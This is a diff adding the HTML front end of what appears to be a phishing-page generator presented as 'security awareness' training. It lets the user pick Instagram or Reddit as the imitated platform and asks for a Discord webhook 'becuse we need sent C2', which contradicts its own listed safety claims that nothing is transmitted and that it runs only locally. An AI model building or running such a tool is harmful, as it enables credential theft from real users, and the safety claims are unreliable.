@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phasingsssssss</title>
+
+    <link rel="stylesheet" href="css/sidebar.css">
+    <link rel="stylesheet" href="css/topbar.css">
+    <link rel="stylesheet" href="css/dashboard.css">
+
+    <link rel="stylesheet" href="css/phishing.css">
+</head>
+
+<body>
+
+    <div id="sidebar"></div>
+
+    <div id="topbar"></div>
+
+    <div class="dashboard">
+
+        <h1>Phising Eduction</h1>
+
+        <p>Create a local-only Security awareness for eduction</p>
+
+        <div class="training-panel">
+
+            <label for="platform">Training Platform</label>
+
+            <select id="platform">
+
+                <option value="instagram">instagram</option>
+
+                <option value="reddit">reddit</option>
+            </select>
+
+            <label for="discord-webhook">Discord Webhook (becuse we need sent C2)</label>
+
+            <input type="text" id="discord-webhook" placeholder="Enter Discord Webhook URL">
+
+
+            <button id="genarte-demo">genarte Local</button>
+
+            <div id="server-status">No demo running</div>
+
+            <div id="url-container">
+
+                <span>Local URl</span>
+
+                <code id="demo-url">-</code>
+            </div>
+
+            <div class="training-actions">
+
+                <button id="open-demo" disabled>
+                    Open Demo
+                </button>
+
+            </div>
+
+        </div>
+
+        <div class="training-info">
+
+            <h2>Safety</h2>
+
+            <ul>
+
+                <li>
+                    Runs only on localhost.
+                </li>
+
+                <li>
+                    No credentials are transmitted.
+                </li>
+
+                <li>
+                    Never enter a real password.
+                </li>
+
+                <li>
+                    The page is for security awareness.
+                </li>
+
+            </ul>
+
+        </div>
+
+        </main>
+
+        <script src="js/load-components.js"></script>
+        <script src="js/phishing.js"></script>
+
+</body>
+
+</html>
